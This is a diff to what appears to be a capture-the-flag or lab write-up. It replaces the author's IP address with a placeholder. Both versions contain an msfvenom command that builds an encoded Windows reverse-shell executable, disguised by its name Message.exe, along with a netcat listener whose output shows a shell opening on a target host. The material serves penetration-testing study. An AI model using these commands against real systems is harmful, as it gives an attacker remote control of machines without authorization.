@@ -297,7 +297,7 @@ Mode                LastWriteTime     Length Name
 On my machine:
 
 ```
-❯ msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=192.168.148.197 LPORT=5555 -f exe -o Message.exe
+❯ msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=<my vpn ip address> LPORT=5555 -f exe -o Message.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -311,7 +311,7 @@ Saved as: Message.exe
 
 ❯ nc -lvnp 5555
 listening on [any] 5555 ...
-connect to [192.168.148.197] from (UNKNOWN) [10.112.179.163] 50282
+connect to [<my vpn ip address>] from (UNKNOWN) [10.112.179.163] 50282
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
